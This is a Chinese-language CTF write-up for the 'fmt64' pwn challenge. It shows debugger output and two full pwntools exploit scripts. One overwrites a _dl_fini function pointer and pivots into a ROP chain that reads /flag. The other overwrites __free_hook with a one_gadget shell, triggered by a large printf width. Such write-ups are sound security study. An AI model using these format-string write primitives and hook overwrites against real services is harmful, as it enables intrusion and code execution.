## fmt64

- 格式化字符串漏洞，要命的是保护全开了，`GOT`表，`fini_array`等函数指针只读，没法修改...

  ```shell
      Arch:     amd64-64-little
      RELRO:    Full RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      PIE enabled
  ```

  而且`printf`之后没有`ret`，直接就`exit(0)`了...所以改写返回地址也没用...

  `PIE`倒是没什么，反正也能各种泄漏

  ```c
  void __fastcall __noreturn sub_9AF(FILE *a1)
  {
    char format; // [rsp+10h] [rbp-110h]
    unsigned __int64 v2; // [rsp+118h] [rbp-8h]
  
    v2 = __readfsqword(0x28u);
    memset(&format, 0, 0x100uLL);
    while ( (unsigned int)read(0, &format, 0x100uLL) )
    {
      fprintf(a1, &format);
      sleep(1u);
    }
    exit(0);
  }
  ```

  `sleep()`没啥能利用的，那就只有`exit()`了...

- `gdb`跟进`exit()`，发现`ld-2.23.so`中有一处函数指针可改写：

  ```shell
   ► 0x7effca8f7b3e <_dl_fini+126>    call   qword ptr [rip + 0x216404] <0x7effca8e7c90>
  
  pwndbg> x/4xg $rip + 0x216404+6
  0x7effcab0df48 <_rtld_global+3848>:	0x00007effca8e7c90	0x00007effca8e7ca0
  0x7effcab0df58 <_rtld_global+3864>:	0x00007effca8fb0b0	0x0000000000000006
  
  pwndbg> vmmap
  LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  ...
  0x7effcab0c000 0x7effcab0d000 r--p 1000  25000 /lib/x86_64-linux-gnu/ld-2.23.so
  0x7effcab0d000 0x7effcab0e000 rw-p 1000  26000 /lib/x86_64-linux-gnu/ld-2.23.so
  0x7effcab0e000 0x7effcab0f000 rw-p 1000  0  
  0x7ffe20323000 0x7ffe20344000 rw-p 21000 0     [stack]
  ```

  虽然开了随机化，但是试了几次，这个函数指针和`libc`之间的偏移量是不变的，因此可以利用

  （感觉这个`_dl_fini`里的函数指针和`__libc_csu_fini`里面的指针差不多......）

- 本来想着用`one_gadget`一波带走这题，但想要执行`exit(0)`必须先退出`  while(read(0, &format, 0x100uLL))`这个循环，有两种方法可以退出循环：

  - 关闭`stdin`：`p.stdin.close()`（适用于本地调试，打远程不行）
  - 中断输入：`p.shutdown('send')` [ref](https://blog.csdn.net/Breeze_CAT/article/details/100087036)

  不管用哪种方法，都没法继续向程序发送数据了，因此即使拿到`shell`也没法输入

- 于是考虑`ROP`，先`open /flag`再`read`+`write`打印出来

- 跟进`_dl_fini`里面调用的那个函数，看下栈分布情况：

  ```shell
  00:0000│ rsp  0x7ffe203411b8 —▸ 0x7effca8f7b44 (_dl_fini+132) 
  01:0008│      0x7ffe203411c0 —▸ 0x7ffe203413d0 
  02:0010│      0x7ffe203411c8 ◂— 0x3000000010
  03:0018│      0x7ffe203411d0 —▸ 0x7ffe203412a0 ◂— 0x0
  04:0020│      0x7ffe203411d8 —▸ 0x7ffe203411e0 ◂— 0x26 /* '&' */
  05:0028│      0x7ffe203411e0 ◂— 0x26 /* '&' */
  06:0030│      0x7ffe203411e8 —▸ 0x7ffe20341310 ◂— 0x0
  07:0038│      0x7ffe203411f0 —▸ 0x7ffe203412b0 ◂— 'hhhhhhhh'
  ```

  发现通过`read()`读的数据，与当前`rsp`离得并不远，于是可以把栈迁移到可控的区域：

- 需要用到两个`gadget`：

  ```
  p6r   = 0x0013cc0f + libc_base
  prsp  = 0x0000000000003838 + libc_base # pop rsp ; ret
  ```

  第一个`gadget`把多余的6个参数`pop`掉，然后第二个`gadget`直接`pop rsp`把栈迁移到`read`读的`buf`

  > P.s. libc中真是什么gadget都有鸭~

  这两个`libc`中的`gadget`需要通过格式字符串漏洞写到栈中（栈中位置也是相对固定的）

- 此前，还需要用格式化字符串漏洞泄漏下libc和栈地址：

  - `libc`直接泄漏`libc_start_main_ret`
  - 栈的话随便找一个就行...

- 栈迁移`gadget`：

  ```assembly
    0x7efe86626c0f <__nscd_getpwnam_r+63>    pop    rcx <0x7efe86ada040>
    0x7efe86626c10 <__nscd_getpwnam_r+64>    pop    rbx
    0x7efe86626c11 <__nscd_getpwnam_r+65>    pop    rbp
    0x7efe86626c12 <__nscd_getpwnam_r+66>    pop    r12
    0x7efe86626c14 <__nscd_getpwnam_r+68>    pop    r13
    0x7efe86626c16 <__nscd_getpwnam_r+70>    pop    r14
    0x7efe86626c18 <__nscd_getpwnam_r+72>    ret    
     ↓
    0x7efe864ed838                           pop    rsp
    0x7efe864ed839                           ret    
     ↓
    0x7efe8651d544 <__gettextparse+1140>     pop    rax ; read buf data
    0x7efe8651d545 <__gettextparse+1141>     ret    
  ```

- 读`flag`的`ROP`链：

  open

  ```assembly
     0x7fd8c2bf2102 <iconv+194>            pop    rdi
     0x7fd8c2bf2103 <iconv+195>            ret    
      ↓
     0x7fd8c2bf12e8 <init_cacheinfo+40>    pop    rsi
     0x7fd8c2bf12e9 <init_cacheinfo+41>    ret    
      ↓
     0x7fd8c2bd2b92                        pop    rdx
   ► 0x7fd8c2bd2b93                        ret             
      ↓
     0x7fd8c2cc8030 <open64>               cmp    dword ptr [rip + 0x2d2709], 0 <0x7fd8c2f9a740>
     0x7fd8c2cc8037 <open64+7>             jne    open64+25 <0x7fd8c2cc8049>
     0x7fd8c2cc8039 <__open_nocancel>      mov    eax, 2
     0x7fd8c2cc803e <__open_nocancel+5>    syscall 
     0x7fd8c2cc8040 <__open_nocancel+7>    cmp    rax, -0xfff
  ```

  read

  ```assembly
     0x7fd8c2bf2102 <iconv+194>            pop    rdi
     0x7fd8c2bf2103 <iconv+195>            ret    
      ↓
     0x7fd8c2bf12e8 <init_cacheinfo+40>    pop    rsi
     0x7fd8c2bf12e9 <init_cacheinfo+41>    ret    
      ↓
     0x7fd8c2bd2b92                        pop    rdx
   ► 0x7fd8c2bd2b93                        ret             
      ↓
     0x7fd8c2cc8250 <read>                 cmp    dword ptr [rip + 0x2d24e9], 0 <0x7fd8c2f9a740>
     0x7fd8c2cc8257 <read+7>               jne    read+25 <0x7fd8c2cc8269>
   
     0x7fd8c2cc8259 <__read_nocancel>      mov    eax, 0
     0x7fd8c2cc825e <__read_nocancel+5>    syscall 
  ```

  write

  ```assembly
     0x7fd8c2bf2102 <iconv+194>             pop    rdi
     0x7fd8c2bf2103 <iconv+195>             ret    
      ↓
     0x7fd8c2bf12e8 <init_cacheinfo+40>     pop    rsi
     0x7fd8c2bf12e9 <init_cacheinfo+41>     ret    
      ↓
     0x7fd8c2bd2b92                         pop    rdx
   ► 0x7fd8c2bd2b93                         ret            
      ↓
     0x7fd8c2cc82b0 <write>                 cmp    dword ptr [rip + 0x2d2489], 0 <0x7fd8c2f9a740>
     0x7fd8c2cc82b7 <write+7>               jne    write+25 <0x7fd8c2cc82c9>
   
     0x7fd8c2cc82b9 <__write_nocancel>      mov    eax, 1
     0x7fd8c2cc82be <__write_nocancel+5>    syscall 
  ```

  > libc gadget真好用:D



- exp:

  ```python
  #!/usr/bin/python
  #coding=utf-8
  #__author__:TaQini
  
  from pwn import *
  
  local_file  = './fmt64'
  local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
  remote_libc = '../libc-2.23.so'
  
  is_local = False
  is_remote = False
  
  if len(sys.argv) == 1:
      is_local = True
      p = process(local_file)
      libc = ELF(local_libc)
  elif len(sys.argv) > 1:
      is_remote = True
      if len(sys.argv) == 3:
          host = sys.argv[1]
          port = sys.argv[2]
      else:
          host, port = sys.argv[1].split(':')
      p = remote(host, port)
      libc = ELF(remote_libc)
  
  elf = ELF(local_file)
  
  # context.log_level = 'debug'
  context.arch = elf.arch
  
  se      = lambda data               :p.send(data) 
  sa      = lambda delim,data         :p.sendafter(delim, data)
  sl      = lambda data               :p.sendline(data)
  sla     = lambda delim,data         :p.sendlineafter(delim, data)
  sea     = lambda delim,data         :p.sendafter(delim, data)
  rc      = lambda numb=4096          :p.recv(numb)
  ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
  uu32    = lambda data               :u32(data.ljust(4, '\0'))
  uu64    = lambda data               :u64(data.ljust(8, '\0'))
  info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
  
  def debug(cmd=''):
      if is_local: gdb.attach(p,cmd)
  
  def leak_addr(pos):
      sl('LLLLLLLL%%%d$p'%(pos))
      return rc()[8:-1]
  
  def show(addr):
      payload = "%10$s".ljust(24,'S')
      payload += p64(addr)
      sl(payload)
      return rc()
  
  def alter_byte(addr,data):
      if data==0:
          payload = "%10$hhn"
      else:
          payload = "%%%dc%%10$hhn"%(data)
      payload = payload.ljust(24,'T')
      payload += p64(addr)
      sl(payload)
      return rc()
  
  def alter_dw(addr,data):
      alter_byte(addr,data&0xff)
      alter_byte(addr+1,(data>>8)&0xff)
      alter_byte(addr+2,(data>>16)&0xff)
      alter_byte(addr+3,(data>>24)&0xff)
  
  def alter_qw(addr,data):
      alter_dw(addr,data)
      alter_dw(addr+4,data>>32)
  
  def flush(c='F'):
      sl(c*8+'\0'*0x80)
      rc()
  
  # info
  # elf, libc
  ru('This\'s my mind!\n')
  
  # leak libc base
  offset___libc_start_main_ret = 0x20830
  libc_base = int(leak_addr(46),16)-offset___libc_start_main_ret
  info_addr('libc_base',libc_base)
  
  # ld-2.23 dl_fini (function array)
  ld_ptr = libc_base + 0x5f0f48  #_dl_fini
  info_addr('ld_ptr',ld_ptr)
  # option
  info_addr('raw func in ptr',u64(show(ld_ptr)[:6]+'\x00\x00'))
  
  # gadget
  p6r   = 0x0013cc0f + libc_base
  prsp  = 0x0000000000003838 + libc_base # pop rsp ; ret
  prdi  = 0x0000000000021102 + libc_base # pop rdi ; ret
  prsi  = 0x00000000000202e8 + libc_base # pop rsi ; ret
  prdx  = 0x0000000000001b92 + libc_base # pop rdx ; ret
  libc_open  = libc.symbols['open'] + libc_base
  libc_read  = libc.symbols['read'] + libc_base
  libc_write = libc.symbols['write'] + libc_base
  
  flush()
  # leak stack 
  stack_base = int(leak_addr(41),16)
  info_addr('stack_base',stack_base)
  
  # calc pivot stack 
  #pwndbg> p 0x7ffc3c28fc58-0x7ffc3c28fe40
  #$1 = -488
  prsp_addr  = stack_base - 488
  
  # prepare to stack pivot
  # g1
  log.success("write p6r:"+hex(p6r)+" to "+hex(ld_ptr));
  alter_dw(ld_ptr, p6r)
  # g2
  log.success("write prsp:"+hex(prsp)+ " to "+hex(prsp_addr));
  alter_qw(prsp_addr, prsp)
  # stack pivot to read buf
  
  # start rop
  ropchain = [
              # open('/flag',0,0x100)
              p64(prdi), p64(stack_base-112),# -> /flag
              p64(prsi), p64(0),
              p64(prdx), p64(0x100),
              p64(libc_open),
              # read(0,buf,0x100)
              p64(prdi), p64(3),
              p64(prsi), p64(stack_base),
              p64(prdx), p64(0x100),
              p64(libc_read),
              # write(1,buf,0x100)
              p64(prdi), p64(1),
              p64(prsi), p64(stack_base),
              p64(prdx), p64(0x100),
              p64(libc_write),
              p64(0xdeadbeef),
              '/flag\0\0\0'
  ]
  
  # debug('b *'+hex(p6r))
  
  flush('\x90')
  sl(''.join(ropchain))
  
  # close stdin to break loop (so one_gadget does not work)
  # p.stdin.close()
  # shutdown sent also work
  p.shutdown("send") 
  
  p.interactive()
  ```

- p.s.做`simple_rop`的时候还说没必要专门搞个`Ubuntu16`的环境，结果做这题时就装个虚拟机....真香

------

- pp.s.以上是我的菜鸡解法......

- 后来看到了[0CTF 2017 Quals: EasiestPrintf](https://poning.me/2017/03/23/EasiestPrintf/) 原来`scanf`和`printf`都有可能触发`malloc`和`free`

  当`printf("%100000c");`的时候就会触发`malloc`申请字符缓冲区，然后用完`free`掉

  因此...直接改`__free_hook`为`one_gadget`，然后输入`"%100000c"`触发`free`就拿到shell了......

  ```python
  #!/usr/bin/python
  #coding=utf-8
  #__author__:TaQini
  
  from pwn import *
  
  local_file  = './fmt64'
  local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
  remote_libc = '../libc-2.23.so'
  
  is_local = False
  is_remote = False
  
  if len(sys.argv) == 1:
      is_local = True
      p = process(local_file)
      libc = ELF(local_libc)
  elif len(sys.argv) > 1:
      is_remote = True
      if len(sys.argv) == 3:
          host = sys.argv[1]
          port = sys.argv[2]
      else:
          host, port = sys.argv[1].split(':')
      p = remote(host, port)
      libc = ELF(remote_libc)
  
  elf = ELF(local_file)
  
  # context.log_level = 'debug'
  context.arch = elf.arch
  
  se      = lambda data               :p.send(data) 
  sa      = lambda delim,data         :p.sendafter(delim, data)
  sl      = lambda data               :p.sendline(data)
  sla     = lambda delim,data         :p.sendlineafter(delim, data)
  sea     = lambda delim,data         :p.sendafter(delim, data)
  rc      = lambda numb=4096          :p.recv(numb)
  ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
  uu32    = lambda data               :u32(data.ljust(4, '\0'))
  uu64    = lambda data               :u64(data.ljust(8, '\0'))
  info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
  
  def debug(cmd=''):
      if is_local: gdb.attach(p,cmd)
  
  def leak_addr(pos):
      sl('LLLLLLLL%%%d$p'%(pos))
      return rc()[8:-1]
  
  def show(addr):
      payload = "%10$s".ljust(24,'S')
      payload += p64(addr)
      sl(payload)
      return rc()
  
  def alter_byte(addr,data):
      if data==0:
          payload = "%10$hhn"
      else:
          payload = "%%%dc%%10$hhn"%(data)
      payload = payload.ljust(24,'T')
      payload += p64(addr)
      sl(payload)
      return rc()
  
  def alter_dw(addr,data):
      alter_byte(addr,data&0xff)
      alter_byte(addr+1,(data>>8)&0xff)
      alter_byte(addr+2,(data>>16)&0xff)
      alter_byte(addr+3,(data>>24)&0xff)
  
  def alter_qw(addr,data):
      alter_dw(addr,data)
      alter_dw(addr+4,data>>32)
  
  def flush(c='F'):
      sl(c*8+'\0'*0x80)
      rc()
  
  # info
  # elf, libc
  ru('This\'s my mind!\n')
  
  # leak libc base
  if is_remote:
      offset___libc_start_main_ret = 0x20830
      offset_one_gadget = 0xf02a4  # execve("/bin/sh", rsp+0x50, environ)
  if is_local:
      offset___libc_start_main_ret = 0x26b6b
      offset_one_gadget = 0x106ef8 # execve("/bin/sh", rsp+0x70, environ)
  
  libc_base = int(leak_addr(46),16)-offset___libc_start_main_ret
  info_addr('libc_base',libc_base)
  
  free_hook = libc_base + libc.symbols['__free_hook']
  info_addr('free_hook',free_hook)
  
  one_gadget = libc_base + offset_one_gadget
  info_addr('one_gadget',one_gadget)
  
  log.success('write one_gadget to free_hook')
  alter_qw(free_hook, one_gadget)
  
  sl("%100000c")
  
  p.interactive()
  ```

  > 我太菜了...T^T